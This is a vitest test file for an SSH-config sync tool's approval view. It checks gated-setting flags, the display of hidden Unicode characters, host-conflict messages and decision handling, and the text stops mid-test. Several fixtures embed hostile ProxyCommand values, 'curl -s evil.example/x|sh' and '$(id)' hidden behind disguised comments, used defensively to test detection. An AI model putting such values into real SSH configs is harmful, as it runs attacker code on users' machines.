import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";

import type { PendingApprovalView } from "@/bindings/PendingApprovalView";
import { NOW, overview } from "./sync-fixtures";
import {
  type AboveList,
  GATED_KEYWORDS,
  GATED_SETTINGS,
  REVIEW_INTRO,
  adoptAtOnce,
  adoptNewest,
  approvalChanges,
  approvalGroups,
  approvalMessage,
  approvalsRowNote,
  blockLines,
  changeText,
  changedNotice,
  combineOutcomes,
  decisionSummary,
  displayLines,
  existingHosts,
  hostKey,
  isSettled,
  lineKeyword,
  listMoved,
  markText,
  revealHidden,
  reviewedVersions,
  runDecision,
  sameVersions,
} from "./sync-approvals";

function pending(overrides: Partial<PendingApprovalView> = {}): PendingApprovalView {
  return {
    space_id: "a".repeat(64),
    space_name: "Work",
    alias: "web",
    digest: "d1",
    text: "Host web\n  HostName 10.0.0.1\n  ProxyCommand nc %h 22\n",
    current_text: null,
    applied: { host: "", gated: [] },
    incoming: { host: "web", gated: [{ keyword: "proxycommand", value: "nc %h 22" }] },
    from_device: "MacBook-B",
    updated_at_ms: NOW,
    ...overrides,
  };
}

describe("GATED_KEYWORDS", () => {
  it("is the backend's list (approval::GATED_KEYWORDS)", () => {
    const rust = readFileSync("src-tauri/src/sync/approval.rs", "utf8");
    const list = /pub const GATED_KEYWORDS: \[&str; \d+\] = \[([^\]]*)\]/.exec(rust)?.[1] ?? "";
    const backend = [...list.matchAll(/"([a-z0-9]+)"/g)].map((m) => m[1]);
    expect(backend.length).toBeGreaterThan(0);
    expect(GATED_KEYWORDS.map((k) => k.toLowerCase())).toEqual(backend);
  });

  it("spells each one the way ssh_config(5) does (approval::GATED_SPELLINGS), for the labels", () => {
    const rust = readFileSync("src-tauri/src/sync/approval.rs", "utf8");
    const list = /const GATED_SPELLINGS: \[&str; \d+\] = \[([^\]]*)\]/.exec(rust)?.[1] ?? "";
    const spellings = [...list.matchAll(/"([A-Za-z0-9]+)"/g)].map((m) => m[1]);
    expect(spellings.length).toBeGreaterThan(0);
    expect([...GATED_KEYWORDS]).toEqual(spellings);
  });
});

describe("revealHidden", () => {
  it("shows the characters that could make a line read differently from what ssh runs", () => {
    expect(revealHidden("nc %h 22 #\u202Eevil")).toBe("nc %h 22 #⟨U+202E⟩evil"); // right-to-left override
    expect(revealHidden("a\u200Bb\u2066c\u2069")).toBe("a⟨U+200B⟩b⟨U+2066⟩c⟨U+2069⟩"); // zero-width space, isolates
    expect(revealHidden("x\u00A0y\uFEFFz\u0007")).toBe("x⟨U+00A0⟩y⟨U+FEFF⟩z⟨U+0007⟩");
  });

  it("leaves ordinary text alone, tabs and non-Latin letters included", () => {
    expect(revealHidden("\tProxyCommand nc café 日本 %h")).toBe("\tProxyCommand nc café 日本 %h");
  });

  it("splits a block into display lines, CRLF included", () => {
    expect(displayLines("Host web\r\n  User\u200B root\r\n")).toEqual(["Host web", "  User⟨U+200B⟩ root"]);
  });
});

describe("revealHidden: letters and marks that draw nothing", () => {
  it("shows the ones that are not format characters or spaces either: fillers, selectors, joiners, the blank Braille cell", () => {
    const cases: [number, string][] = [
      [0x115f, "⟨U+115F⟩"], // Hangul choseong filler
      [0x1160, "⟨U+1160⟩"], // Hangul jungseong filler
      [0x3164, "⟨U+3164⟩"], // Hangul filler
      [0xffa0, "⟨U+FFA0⟩"], // halfwidth Hangul filler
      [0x034f, "⟨U+034F⟩"], // combining grapheme joiner
      [0xfe0f, "⟨U+FE0F⟩"], // variation selector-16
      [0x180b, "⟨U+180B⟩"], // Mongolian free variation selector
      [0x2800, "⟨U+2800⟩"], // Braille pattern blank
      [0xe0100, "⟨U+E0100⟩"], // variation selector supplement, outside the BMP
    ];
    for (const [code, shown] of cases) {
      expect(revealHidden(`bastion${String.fromCodePoint(code)}#x`), shown).toBe(`bastion${shown}#x`);
    }
  });

  it("still shows what it showed before: bidi controls, zero-width and format characters, controls, non-ASCII spaces, separators", () => {
    expect(revealHidden("a\u{202E}b\u{200B}c\u{2066}d\u{AD}e\u{85}f\u{A0}g\u{3000}h\u{2028}i\u{2029}j")).toBe(
      "a⟨U+202E⟩b⟨U+200B⟩c⟨U+2066⟩d⟨U+00AD⟩e⟨U+0085⟩f⟨U+00A0⟩g⟨U+3000⟩h⟨U+2028⟩i⟨U+2029⟩j",
    );
  });

  it("shows the blank-by-design characters that are neither default-ignorable nor marks: the null notehead, the blank hieroglyphs, the ideographic half fill space", () => {
    const cases: [number, string][] = [
      [0x1d159, "⟨U+1D159⟩"], // musical null notehead
      [0x13441, "⟨U+13441⟩"], // Egyptian hieroglyph full blank
      [0x13442, "⟨U+13442⟩"], // Egyptian hieroglyph half blank
      [0x303f, "⟨U+303F⟩"], // ideographic half fill space (a symbol, not a space separator)
    ];
    for (const [code, shown] of cases) {
      expect(revealHidden(`bastion${String.fromCodePoint(code)}#x`), shown).toBe(`bastion${shown}#x`);
    }
  });

  it("shows a combining mark that has no letter or digit to sit on: after a space, a metacharacter, `=`, a tab or a line start", () => {
    const acute = "\u{301}";
    expect(revealHidden(`nc %h %p;${acute}#$(curl -s evil.example/x|sh)`)).toBe("nc %h %p;⟨U+0301⟩#$(curl -s evil.example/x|sh)");
    expect(revealHidden(`ProxyCommand=${acute}#$(id)`)).toBe("ProxyCommand=⟨U+0301⟩#$(id)");
    expect(revealHidden(`bastion ${acute}#$(id)`)).toBe("bastion ⟨U+0301⟩#$(id)");
    expect(revealHidden(`a\t${acute}#`)).toBe("a\t⟨U+0301⟩#");
    expect(revealHidden(`${acute}#x`)).toBe("⟨U+0301⟩#x");
    expect(revealHidden(`x|${acute}#`)).toBe("x|⟨U+0301⟩#");
    // The Khitan filler is a mark too (not default-ignorable), so it is shown wherever it has no base.
    expect(revealHidden("bastion \u{16FE4}#x")).toBe("bastion ⟨U+16FE4⟩#x");
  });

  it("shows every mark of a run that has no base, and a mark that follows a character that was just shown", () => {
    expect(revealHidden("a;\u{301}\u{302}\u{323}#")).toBe("a;⟨U+0301⟩⟨U+0302⟩⟨U+0323⟩#");
    // The Hangul filler is shown as a code, so a mark after it has nothing to sit on either.
    expect(revealHidden("a\u{3164}\u{301}b")).toBe("a⟨U+3164⟩⟨U+0301⟩b");
    expect(revealHidden("a\u{200B}\u{301}b")).toBe("a⟨U+200B⟩⟨U+0301⟩b");
  });

  it("leaves legitimate accents alone: marks on letters and digits, stacked marks, Devanagari and Thai words", () => {
    const plain = [
      "cafe\u{301} nc", // a decomposed é
      "e\u{301}\u{323}", // stacked marks on one letter
      "1\u{301}2", // a digit can carry a mark
      "\u{928}\u{92E}\u{938}\u{94D}\u{924}\u{947}", // Devanagari: consonants, virama, vowel sign
      "\u{E2A}\u{E27}\u{E31}\u{E2A}\u{E14}\u{E35}", // Thai: consonants with vowel marks
      "\u{E9}", // a precomposed é
    ];
    for (const text of plain) expect(revealHidden(text), text).toBe(text);
    // The same accent is shown once a space (not a letter) is what it follows.
    expect(revealHidden("cafe\u{301} \u{301}")).toBe("cafe\u{301} ⟨U+0301⟩");
  });

  it("shows an orphan mark in a block line, so a ProxyCommand's comment cannot start where it only looks as if it does", () => {
    const value = "nc %h %p;\u{301}#$(curl -s evil.example/x|sh)";
    const view = pending({
      text: `Host web\n  ProxyCommand ${value}\n`,
      incoming: { host: "web", gated: [{ keyword: "proxycommand", value }] },
    });
    expect(blockLines(view)[1]).toEqual({ text: "  ProxyCommand nc %h %p;⟨U+0301⟩#$(curl -s evil.example/x|sh)", gated: true, scope: false });
  });

  it("shows the filler that would make a ProxyCommand's shell comment look as if it started elsewhere", () => {
    const value = "ssh -W %h:%p bastion\u{3164}#$(curl -s evil.example/x|sh)";
    const view = pending({
      text: `Host web\n  ProxyCommand ${value}\n`,
      incoming: { host: "web", gated: [{ keyword: "proxycommand", value }] },
    });
    expect(blockLines(view)[1]).toEqual({
      text: "  ProxyCommand ssh -W %h:%p bastion⟨U+3164⟩#$(curl -s evil.example/x|sh)",
      gated: true,
      scope: false,
    });
    expect(approvalChanges(view).map(changeText)).toContain("Adds ProxyCommand ssh -W %h:%p bastion⟨U+3164⟩#$(curl -s evil.example/x|sh)");
  });
});

describe("lineKeyword", () => {
  it("reads the keyword in either spelling, ignoring case", () => {
    expect(lineKeyword("  ProxyCommand nc %h 22")).toBe("proxycommand");
    expect(lineKeyword("\tforwardagent=yes")).toBe("forwardagent");
    expect(lineKeyword("FORWARDX11 yes")).toBe("forwardx11");
    expect(lineKeyword("Host web prod")).toBe("host");
  });

  it("has none for comments, disabled lines and blanks", () => {
    expect(lineKeyword("  # ProxyCommand nc %h 22")).toBeNull();
    expect(lineKeyword("")).toBeNull();
    expect(lineKeyword("   ")).toBeNull();
  });
});

describe("blockLines", () => {
  it("marks the gated settings of the incoming block", () => {
    expect(blockLines(pending())).toEqual([
      { text: "Host web", gated: false, scope: false },
      { text: "  HostName 10.0.0.1", gated: false, scope: false },
      { text: "  ProxyCommand nc %h 22", gated: true, scope: false },
    ]);
  });

  it("marks the Host line when an existing host now applies to more names", () => {
    const view = pending({
      text: "Host web prod\n  ForwardAgent=yes\n",
      current_text: "Host web\n  ForwardAgent yes\n",
      applied: { host: "web", gated: [{ keyword: "forwardagent", value: "yes" }] },
      incoming: { host: "web prod", gated: [{ keyword: "forwardagent", value: "yes" }] },
    });
    expect(blockLines(view)).toEqual([
      { text: "Host web prod", gated: false, scope: true },
      { text: "  ForwardAgent=yes", gated: true, scope: false },
    ]);
  });

  it("marks the Host line of a host that is not in its space yet when it names more than one host (or a pattern)", () => {
    const gated = [{ keyword: "forwardagent", value: "yes" }];
    const two = pending({ text: "Host web prod\n  ForwardAgent yes\n", incoming: { host: "web prod", gated } });
    expect(blockLines(two)[0]).toEqual({ text: "Host web prod", gated: false, scope: true });
    const pattern = pending({ text: "Host web*\n  ForwardAgent yes\n", incoming: { host: "web*", gated } });
    expect(blockLines(pattern)[0].scope).toBe(true);
    // One name, even with a comment after it: nothing wider than what the change list already says.
    const one = pending({ text: "Host web # my box\n  ForwardAgent yes\n", incoming: { host: "web # my box", gated } });
    expect(blockLines(one)[0].scope).toBe(false);
    // A host this computer has already is judged by whether its scope changed (the test above).
    const known = pending({
      text: "Host web prod\n  ForwardAgent yes\n",
      current_text: "Host web prod\n  ForwardAgent yes\n",
      applied: { host: "web prod", gated },
      incoming: { host: "web prod", gated },
    });
    expect(blockLines(known)[0].scope).toBe(false);
  });

  it("compares a forward's text the way the backend trims it: by Unicode White_Space, which keeps U+FEFF and drops U+0085", () => {
    const view = pending({
      text: "Host web\n  LocalForward *:8080 host:80 #note\u{FEFF}\n  DynamicForward 0.0.0.0:1080 #x\u{85}\n",
      incoming: {
        host: "web",
        gated: [
          { keyword: "localforward", value: "*:8080 host:80 #note\u{FEFF}" },
          { keyword: "dynamicforward", value: "0.0.0.0:1080 #x" },
        ],
      },
    });
    expect(blockLines(view).map((line) => line.gated)).toEqual([false, true, true]);
  });
});

describe("forwards and hidden characters", () => {
  it("marks a forward the backend gates (a bind address) but not one with only a port, and labels it", () => {
    const view = pending({
      text: "Host web\n  LocalForward 8080 db:80\n  LocalForward *:5432 db:5432\n  DynamicForward 0.0.0.0:1080\n",
      incoming: {
        host: "web",
        gated: [
          { keyword: "localforward", value: "*:5432 db:5432" },
          { keyword: "dynamicforward", value: "0.0.0.0:1080" },
        ],
      },
    });
    expect(blockLines(view).map((line) => line.gated)).toEqual([false, false, true, true]);
    expect(approvalChanges(view).map(changeText)).toEqual([
      "Not in Work on this computer yet: Host web",
      "Adds LocalForward *:5432 db:5432",
      "Adds DynamicForward 0.0.0.0:1080",
    ]);
  });

  it("reveals bidi and zero-width characters in the block and in the changes", () => {
    const view = pending({
      text: "Host web\r\n  ProxyCommand nc %h 22 #\u202E evil\r\n",
      incoming: { host: "web", gated: [{ keyword: "proxycommand", value: "nc %h 22 #\u202E evil" }] },
    });
    expect(blockLines(view)).toEqual([
      { text: "Host web", gated: false, scope: false },
      { text: "  ProxyCommand nc %h 22 #⟨U+202E⟩ evil", gated: true, scope: false },
    ]);
    expect(approvalChanges(view).map(changeText)).toContain("Adds ProxyCommand nc %h 22 #⟨U+202E⟩ evil");
  });
});

describe("approvalChanges", () => {
  it("says a host is not in its space on this computer yet (it may exist elsewhere), and lists each gated setting it brings", () => {
    const changes = approvalChanges(pending());
    expect(changes).toEqual([
      { kind: "not_in_space", space: "Work", host: "web" },
      { kind: "added", keyword: "proxycommand", value: "nc %h 22" },
    ]);
    expect(changes.map(changeText)).toEqual(["Not in Work on this computer yet: Host web", "Adds ProxyCommand nc %h 22"]);
  });

  it("covers the settings added in review: commands on the server and host-key checks", () => {
    const view = pending({
      text: "Host web\n  StrictHostKeyChecking no\n  RemoteCommand tmux attach\n",
      incoming: {
        host: "web",
        gated: [
          { keyword: "stricthostkeychecking", value: "no" },
          { keyword: "remotecommand", value: "tmux attach" },
        ],
      },
    });
    expect(blockLines(view).map((line) => line.gated)).toEqual([false, true, true]);
    expect(approvalChanges(view).map(changeText)).toEqual([
      "Not in Work on this computer yet: Host web",
      "Adds StrictHostKeyChecking no",
      "Adds RemoteCommand tmux attach",
    ]);
  });

  it("shows a changed value, a removal and a wider Host line, and leaves untouched settings out", () => {
    const view = pending({
      current_text: "Host web\n  LocalCommand a\n  ProxyCommand nc %h 22\n  ForwardAgent yes\n",
      applied: {
        host: "web",
        gated: [
          { keyword: "localcommand", value: "a" },
          { keyword: "proxycommand", value: "nc %h 22" },
          { keyword: "forwardagent", value: "yes" },
        ],
      },
      incoming: {
        host: "web prod",
        gated: [
          { keyword: "localcommand", value: "b" },
          { keyword: "forwardagent", value: "yes" },
        ],
      },
    });
    expect(approvalChanges(view).map(changeText)).toEqual([
      "Applies to: web → web prod",
      "LocalCommand: a → b",
      "Removes ProxyCommand nc %h 22",
    ]);
  });

  it("calls a reordered setting a reorder (the order decides which value ssh uses)", () => {
    const view = pending({
      current_text: "Host web\n  ProxyCommand x\n  LocalCommand y\n",
      applied: { host: "web", gated: [{ keyword: "proxycommand", value: "x" }, { keyword: "localcommand", value: "y" }] },
      incoming: { host: "web", gated: [{ keyword: "localcommand", value: "y" }, { keyword: "proxycommand", value: "x" }] },
    });
    expect(approvalChanges(view)).toEqual([{ kind: "moved", keyword: "localcommand", value: "y" }]);
    expect(approvalChanges(view).map(changeText)).toEqual(["Order changed: LocalCommand y"]);
  });

  it("adds a second setting of the same kind next to an existing one", () => {
    const view = pending({
      current_text: "Host web\n  RemoteForward 9000 localhost:9000\n",
      applied: { host: "web", gated: [{ keyword: "remoteforward", value: "9000 localhost:9000" }] },
      incoming: {
        host: "web",
        gated: [
          { keyword: "remoteforward", value: "9000 localhost:9000" },
          { keyword: "remoteforward", value: "5432 db:5432" },
        ],
      },
    });
    expect(approvalChanges(view).map(changeText)).toEqual(["Adds RemoteForward 5432 db:5432"]);
  });
});

describe("a host this computer already has elsewhere", () => {
  const main = "/home/f/.ssh/config";
  const alpha = "/home/f/.ssh/sshelter/alpha-11111111.config";
  const work = "/home/f/.ssh/sshelter/work-aaaaaaaa.config"; // the held host's own space (`pending()`)
  const zeta = "/home/f/.ssh/sshelter/zeta-33333333.config";
  // The overview lists the spaces in the order of the Include list; a space that is not on this computer has no file.
  const spaces = [
    { id: "1".repeat(64), name: "Alpha", file_path: alpha },
    { id: "a".repeat(64), name: "Work", file_path: work },
    { id: "3".repeat(64), name: "Zeta", file_path: zeta },
    { id: "4".repeat(64), name: "Off", file_path: null },
  ];
  const config = [
    { patterns: ["*"], source_file: main },
    { patterns: ["web", "prod"], source_file: main },
    { patterns: ["db"], source_file: alpha },
    { patterns: ["nas"], source_file: "/home/f/.ssh/extra.config" },
  ];

  it("finds the hosts a held host's names would sit in front of: any pattern of theirs, in any file", () => {
    // `web` is one of two names of a host in the main config.
    expect(existingHosts(pending(), config)).toEqual([{ name: "web", file: main }]);
    // `db` is in another space's file.
    expect(existingHosts(pending({ alias: "db", incoming: { host: "db", gated: [] } }), config)).toEqual([{ name: "db", file: alpha }]);
    // The other names on the incoming Host line count too, and each match names its file.
    const wide = pending({ alias: "cache", incoming: { host: "cache prod db", gated: [] } });
    expect(existingHosts(wide, config)).toEqual([
      { name: "prod", file: main },
      { name: "db", file: alpha },
    ]);
  });

  it("finds nothing when no host has the name (a `Host *` default is not one), or when the host already applies to it", () => {
    expect(existingHosts(pending({ alias: "cache", incoming: { host: "cache", gated: [] } }), config)).toEqual([]);
    expect(existingHosts(pending(), [])).toEqual([]);
    const known = pending({ current_text: "Host web\n  ForwardAgent yes\n", applied: { host: "web", gated: [] } });
    expect(existingHosts(known, config)).toEqual([]);
  });

  it("checks the names a widened scope adds to a host it already has, not the ones it already applied to", () => {
    const widened = pending({
      current_text: "Host web\n  ForwardAgent yes\n",
      applied: { host: "web", gated: [{ keyword: "forwardagent", value: "yes" }] },
      incoming: { host: "web prod", gated: [{ keyword: "forwardagent", value: "yes" }] },
    });
    // `web` is also in the main config, but this host applied to it already; `prod` is new to it.
    expect(existingHosts(widened, config)).toEqual([{ name: "prod", file: main }]);
    expect(approvalChanges(widened, config, spaces).map(changeText)).toEqual([
      "Applies to: web → web prod",
      "Takes over prod in /home/f/.ssh/config (synced files are read first)",
    ]);
    expect(existingHosts(widened, [{ patterns: ["web"], source_file: main }])).toEqual([]);
  });

  it("does not claim which block comes first when a widened scope meets another block of the host's own space file", () => {
    // The held block is replaced where it stands (nothing is appended), so only their order in that file decides.
    const widened = pending({
      current_text: "Host web\n  ForwardAgent yes\n",
      applied: { host: "web", gated: [{ keyword: "forwardagent", value: "yes" }] },
      incoming: { host: "web prod", gated: [{ keyword: "forwardagent", value: "yes" }] },
    });
    expect(approvalChanges(widened, [{ patterns: ["prod"], source_file: work }], spaces).map(changeText)).toEqual([
      "Applies to: web → web prod",
      "prod is also a name of another block in /home/f/.ssh/sshelter/work-aaaaaaaa.config: whichever of the two blocks comes first there wins wherever it sets a value. ForwardAgent from this block applies unless the other block is read first and sets it too.",
    ]);
  });

  it("says approving takes over a host in a file that is not a space's: synced files are read first", () => {
    expect(approvalChanges(pending(), config, spaces).map(changeText)).toEqual([
      "Not in Work on this computer yet: Host web",
      "Takes over web in /home/f/.ssh/config (synced files are read first)",
      "Adds ProxyCommand nc %h 22",
    ]);
  });

  it("says another space's file wins or loses by its place in the Include list", () => {
    const db = pending({ alias: "db", incoming: { host: "db", gated: [] } });
    // Alpha comes before Work: its block is read first and its values win where it sets them.
    expect(approvalChanges(db, config, spaces).map(changeText)).toEqual([
      "Not in Work on this computer yet: Host db",
      "db is also in /home/f/.ssh/sshelter/alpha-11111111.config (space Alpha), which is read before Work: its values win wherever it sets one",
    ]);
    // Zeta comes after Work: the approved block is read first.
    const inZeta = [{ patterns: ["db"], source_file: zeta }];
    expect(approvalChanges(db, inZeta, spaces).map(changeText)[1]).toBe("Takes over db in /home/f/.ssh/sshelter/zeta-33333333.config (space Zeta, read after Work)");
    // The order of the list counts, not the names: listed first, Zeta comes before Work.
    const zetaFirst = [spaces[2], spaces[1], spaces[0], spaces[3]];
    expect(approvalChanges(db, inZeta, zetaFirst).map(changeText)[1]).toBe(
      "db is also in /home/f/.ssh/sshelter/zeta-33333333.config (space Zeta), which is read before Work: its values win wherever it sets one",
    );
  });

  it("says the held block's gated settings still apply next to a block that is read first, and names them (another space's file)", () => {
    // ssh takes each setting from the first block that sets it, so Alpha's block winning does not make the held block's ProxyCommand go away.
    const gated = [
      { keyword: "proxycommand", value: "nc %h 22" },
      { keyword: "localcommand", value: "echo hi" },
      { keyword: "remoteforward", value: "9000 localhost:9000" },
      { keyword: "sendenv", value: "FOO" },
      { keyword: "proxycommand", value: "nc %h 23" }, // a keyword is named once however often it appears
    ];
    const db = pending({ alias: "db", incoming: { host: "db", gated } });
    expect(approvalChanges(db, config, spaces).map(changeText)[1]).toBe(
      "db is also in /home/f/.ssh/sshelter/alpha-11111111.config (space Alpha), which is read before Work: its values win wherever it sets one. " +
        "ProxyCommand and LocalCommand from this block still apply unless that block sets them too. " +
        "RemoteForward and SendEnv from this block apply either way, because they add up across blocks.",
    );
    // One setting of each kind, in the singular.
    const one = pending({ alias: "db", incoming: { host: "db", gated: [{ keyword: "localforward", value: "*:8080 host:80" }] } });
    expect(approvalChanges(one, config, spaces).map(changeText)[1]).toBe(
      "db is also in /home/f/.ssh/sshelter/alpha-11111111.config (space Alpha), which is read before Work: its values win wherever it sets one. " +
        "LocalForward from this block applies either way, because it adds up across blocks.",
    );
  });

  it("says the same where the earlier block is another block of the host's own space file", () => {
    const own = [{ patterns: ["db", "web"], source_file: work }];
    const gated = [
      { keyword: "proxycommand", value: "nc %h 22" },
      { keyword: "forwardagent", value: "yes" },
    ];
    const held = pending({ incoming: { host: "web", gated } });
    expect(approvalChanges(held, own, spaces).map(changeText)[1]).toBe(
      "web is also a name of another block in /home/f/.ssh/sshelter/work-aaaaaaaa.config: that block comes first and its values win wherever it sets one. " +
        "ProxyCommand and ForwardAgent from this block still apply unless that block sets them too.",
    );
  });

  it("adds nothing about gated settings when the held block has none, or when it is the one read first", () => {
    const db = pending({ alias: "db", incoming: { host: "db", gated: [] } });
    expect(approvalChanges(db, config, spaces).map(changeText)[1]).not.toContain("this block");
    // Zeta is read after Work and the main config after every space: the held block comes first, so nothing of it is held back.
    const inZeta = [{ patterns: ["db"], source_file: zeta }];
    expect(approvalChanges(pending({ alias: "db" }), inZeta, spaces).map(changeText)[1]).toBe(
      "Takes over db in /home/f/.ssh/sshelter/zeta-33333333.config (space Zeta, read after Work)",
    );
    expect(approvalChanges(pending(), config, spaces).map(changeText)[1]).toBe("Takes over web in /home/f/.ssh/config (synced files are read first)");
  });

  it("says a block of the held host's own space file keeps its values, instead of calling the host new there", () => {
    // `web` is the second name of another record in Work's own file; the approved block would be added after it.
    const own = [{ patterns: ["db", "web"], source_file: work }];
    expect(approvalChanges(pending(), own, spaces).map(changeText)).toEqual([
      "A new block in Work: Host web",
      "web is also a name of another block in /home/f/.ssh/sshelter/work-aaaaaaaa.config: that block comes first and its values win wherever it sets one. ProxyCommand from this block still applies unless that block sets it too.",
      "Adds ProxyCommand nc %h 22",
    ]);
  });

  it("does not guess the order when the spaces are not known (yet), or the held host's space is not among them", () => {
    const generic =
      "web is also in /home/f/.ssh/config: ssh reads synced files first, and between two of them the Include order decides. ProxyCommand from this block applies unless the other block is read first and sets it too.";
    expect(approvalChanges(pending(), config).map(changeText)[1]).toBe(generic);
    expect(approvalChanges(pending(), config, undefined).map(changeText)[1]).toBe(generic);
    expect(approvalChanges(pending(), config, [spaces[0], spaces[2]]).map(changeText)[1]).toBe(generic); // no Work in the list
  });

  it("reveals hidden characters in the file and space names, and says nothing more when there is no such host", () => {
    const odd = [{ patterns: ["web"], source_file: "/home/f/.ssh/we\u{202E}ird.config" }];
    expect(approvalChanges(pending(), odd, spaces).map(changeText)[1]).toBe("Takes over web in /home/f/.ssh/we⟨U+202E⟩ird.config (synced files are read first)");
    const named = [{ id: "1".repeat(64), name: "Al\u{3164}pha", file_path: alpha }, spaces[1]];
    expect(approvalChanges(pending({ alias: "db", incoming: { host: "db", gated: [] } }), config, named).map(changeText)[1]).toContain("(space Al⟨U+3164⟩pha)");
    expect(approvalChanges(pending(), [], spaces).map(changeText)).toEqual(["Not in Work on this computer yet: Host web", "Adds ProxyCommand nc %h 22"]);
  });

  it("does not repeat the 'takes over' note for names a host already applies to (the settings changes cover it)", () => {
    const known = pending({
      current_text: "Host web\n  ProxyCommand nc %h 22\n",
      applied: { host: "web", gated: [{ keyword: "proxycommand", value: "nc %h 22" }] },
      incoming: { host: "web", gated: [{ keyword: "proxycommand", value: "nc %h 23" }] },
    });
    expect(approvalChanges(known, config, spaces).map(changeText)).toEqual(["ProxyCommand: nc %h 22 → nc %h 23"]);
  });
});

describe("approvalGroups", () => {
  it("groups by space in the order the backend listed them", () => {
    const personal = { space_id: "p".repeat(64), space_name: "Personal" };
    const groups = approvalGroups([pending(), pending({ ...personal, alias: "nas" }), pending({ alias: "db" })]);
    expect(groups.map((g) => [g.spaceName, g.views.map((v) => v.alias)])).toEqual([
      ["Work", ["web", "db"]],
      ["Personal", ["nas"]],
    ]);
    expect(groups[0].spaceId).toBe("a".repeat(64));
  });
});

describe("deciding on exactly the versions shown", () => {
  it("sends back the alias and digest of each shown version", () => {
    expect(reviewedVersions([pending(), pending({ alias: "db", digest: "d2" })])).toEqual([
      { alias: "web", digest: "d1" },
      { alias: "db", digest: "d2" },
    ]);
  });

  it("notices when the waiting list moved on: new content for a host, a new host, one gone", () => {
    const shown = [pending(), pending({ alias: "db", digest: "d2" })];
    expect(sameVersions(shown, [shown[1], shown[0]])).toBe(true);
    // Pulled again later, the same version keeps its digest; a renamed space does not make it new either.
    expect(sameVersions(shown, shown.map((v) => ({ ...v, space_name: "Office" })))).toBe(true);
    expect(sameVersions(shown, [pending({ digest: "d3" }), shown[1]])).toBe(false);
    expect(sameVersions(shown, [shown[0]])).toBe(false);
    expect(sameVersions(shown, [...shown, pending({ alias: "nas", digest: "d4" })])).toBe(false);
    expect(sameVersions(shown, [shown[0], pending({ space_id: "b".repeat(64), alias: "db", digest: "d2" })])).toBe(false);
  });

  it("runs a decision as one call per space with exactly the versions shown, in order, and stops at the first failure", async () => {
    const nas = pending({ space_id: "p".repeat(64), space_name: "Personal", alias: "nas", digest: "d3" });
    const pi = pending({ space_id: "q".repeat(64), space_name: "Lab", alias: "pi", digest: "d4" });
    const batches = approvalGroups([pending(), pending({ alias: "db", digest: "d2" }), nas, pi]);
    const outcome = (applied: number) => ({ applied, changed: [], overview: overview() });

    const calls: [string, unknown][] = [];
    const results = await runDecision(batches, async (spaceId, approvals) => {
      calls.push([spaceId, approvals]);
      return outcome(approvals.length);
    });
    expect(calls).toEqual([
      ["a".repeat(64), [{ alias: "web", digest: "d1" }, { alias: "db", digest: "d2" }]],
      ["p".repeat(64), [{ alias: "nas", digest: "d3" }]],
      ["q".repeat(64), [{ alias: "pi", digest: "d4" }]],
    ]);
    expect(results.map((r) => [r.batch.spaceName, r.outcome.applied])).toEqual([["Work", 2], ["Personal", 1], ["Lab", 1]]);

    // The second space fails: the first stays done and the third is never asked.
    const asked: string[] = [];
    const partial = await runDecision(batches, async (spaceId) => {
      asked.push(spaceId);
      if (spaceId === "p".repeat(64)) throw new Error("the relay refused");
      return outcome(1);
    });
    expect(asked).toEqual(["a".repeat(64), "p".repeat(64)]);
    expect(partial.map((r) => r.batch.spaceName)).toEqual(["Work"]);
  });

  it("combines the outcomes of a decision: what went through, which versions were decided, which hosts changed first", () => {
    const [work, personal] = approvalGroups([
      pending(),
      pending({ alias: "db", digest: "d2" }),
      pending({ space_id: "p".repeat(64), space_name: "Personal", alias: "nas", digest: "d3" }),
    ]);
    const outcome = (applied: number, changed: string[]) => ({ applied, changed, overview: overview() });
    expect(
      combineOutcomes([
        { batch: work, outcome: outcome(1, ["db"]) },
        { batch: personal, outcome: outcome(1, []) },
      ]),
    ).toEqual({
      applied: 2,
      decided: [work.views[0], personal.views[0]],
      changed: [{ spaceId: "a".repeat(64), spaceName: "Work", alias: "db" }],
    });
    expect(combineOutcomes([])).toEqual({ applied: 0, decided: [], changed: [] });
  });

  it("says which hosts changed while the review was open, naming their space, and nothing when none did", () => {
    const web = { spaceId: "a", spaceName: "Work", alias: "web" };
    const db = { spaceId: "a", spaceName: "Work", alias: "db" };
    const nas = { spaceId: "p", spaceName: "Personal", alias: "nas" };
    expect(changedNotice([])).toBeNull();
    expect(changedNotice([], [])).toBeNull();
    expect(changedNotice([web])).toBe("web in Work changed since you opened this — review it again.");
    expect(changedNotice([web, nas])).toBe("web in Work, nas in Personal changed since you opened this — review them again.");
    expect(changedNotice([], [nas])).toBe("nas in Personal is new since you opened this — review it.");
    expect(changedNotice([], [web, db])).toBe("web in Work, db in Work are new since you opened this — review them.");
    expect(changedNotice([db], [nas])).toBe(
      "db in Work changed since you opened this — review it again. nas in Personal is new since you opened this — review it.",
    );
  });

  it("names a host once, as changed rather than new when both say so, and reveals hidden characters in what it prints", () => {
    const web = { spaceId: "a", spaceName: "Work", alias: "web" };
    expect(changedNotice([web, web], [web])).toBe("web in Work changed since you opened this — review it again.");
    expect(changedNotice([{ spaceId: "a", spaceName: "Wo\u{202E}rk", alias: "we\u{3164}b" }])).toBe(
      "we⟨U+3164⟩b in Wo⟨U+202E⟩rk changed since you opened this — review it again.",
    );
  });

  it("says what a decision for everything did only for what succeeded", () => {
    expect(decisionSummary("approve", 3, 3)).toEqual({ level: "success", text: "Applied 3 hosts" });
    expect(decisionSummary("approve", 1, 1)).toEqual({ level: "success", text: "Applied 1 host" });
    expect(decisionSummary("reject", 3, 3)).toEqual({ level: "success", text: "Kept this computer's version of 3 hosts" });
    // Some were skipped as changed, or a later space failed: say how many went through, not that it worked.
    expect(decisionSummary("approve", 2, 5)).toEqual({ level: "warning", text: "Applied 2 of 5 hosts" });
    expect(decisionSummary("reject", 1, 3)).toEqual({ level: "warning", text: "Kept this computer's version of 1 of 3 hosts" });
    // Nothing went through: the error toast or the notice says why.
    expect(decisionSummary("approve", 0, 3)).toBeNull();
  });
});

describe("versions that change while the review is open", () => {
  const web1 = pending();
  const db2 = pending({ alias: "db", digest: "d2" });
  const db3 = pending({ alias: "db", digest: "d3" });
  const nas = pending({ alias: "nas", digest: "d4" });
  const key = (view: PendingApprovalView) => hostKey(view.space_id, view.alias);
  const ref = (view: PendingApprovalView) => ({ spaceId: view.space_id, spaceName: view.space_name, alias: view.alias });

  it("marks a host whose version changed behind the user's back while they decided on another host", () => {
    // On screen: web (d1) and db (d2). Another computer re-pushes db (d3); the user approves web.
    const adoption = adoptNewest([web1, db2], [db3], new Map(), [web1]);
    expect(adoption.marks).toEqual(new Map([[key(db3), "changed"]]));
